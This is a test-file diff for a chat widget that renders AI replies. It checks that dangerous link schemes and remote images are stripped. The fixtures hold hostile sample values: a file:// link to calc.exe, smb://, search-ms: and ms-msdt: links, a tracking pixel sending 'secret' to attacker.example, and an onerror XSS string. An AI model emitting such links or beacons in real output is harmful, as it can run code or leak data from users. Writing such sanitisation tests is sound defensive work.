@@ -105,8 +105,40 @@ describe('FeedbackChat', () => {
     type('Help')
     expect(await screen.findByText(/<img src=x onerror/)).toBeTruthy()
     expect(screen.getByRole('log').querySelector('img')).toBeNull()
-    expect(screen.getByText('this').closest('a')?.hasAttribute('href')).toBe(
-      false
+    expect(screen.getByText('this').closest('a')).toBeNull()
+  })
+
+  it('links a reply only to the web or mail and loads no remote images', async () => {
+    vi.mocked(chatReport).mockResolvedValue({
+      reply: [
+        '[Docs](https://docs.readyset.io/rdst) [Mail](mailto:support@readyset.io)',
+        '[Run](file:///C:/Windows/System32/calc.exe) [Share](smb://attacker.example/x)',
+        '[Search](search-ms:query=x) <a href="ms-msdt:/id">Raw</a>',
+        '![Beacon](https://attacker.example/pixel.png?q=secret)',
+        '![Logo](/icons/logo.png) ![Dot](data:image/png;base64,iVBORw0KGgo=)',
+      ].join('\n\n'),
+      ai: true,
+    })
+    renderWithClient(<FeedbackChat isOpen onClose={() => {}} />)
+
+    type('Where are the docs?')
+    await screen.findByText('Docs')
+    const links = [...document.querySelectorAll('a')].map((a) =>
+      a.getAttribute('href')
     )
+    expect(links).toContain('https://docs.readyset.io/rdst')
+    expect(links).toContain('mailto:support@readyset.io')
+    expect(links.join(' ')).not.toMatch(/file:|smb:|search-ms:|ms-msdt:/)
+    // Refused links keep their text.
+    expect(screen.getByText('Run').closest('a')).toBeNull()
+    expect(screen.getByText('Share').closest('a')).toBeNull()
+    const images = [...document.querySelectorAll('img')].map((img) =>
+      img.getAttribute('src')
+    )
+    expect(images).toEqual([
+      `${window.location.origin}/icons/logo.png`,
+      'data:image/png;base64,iVBORw0KGgo=',
+    ])
+    expect(screen.getByText('Beacon')).toBeTruthy()
   })
 })
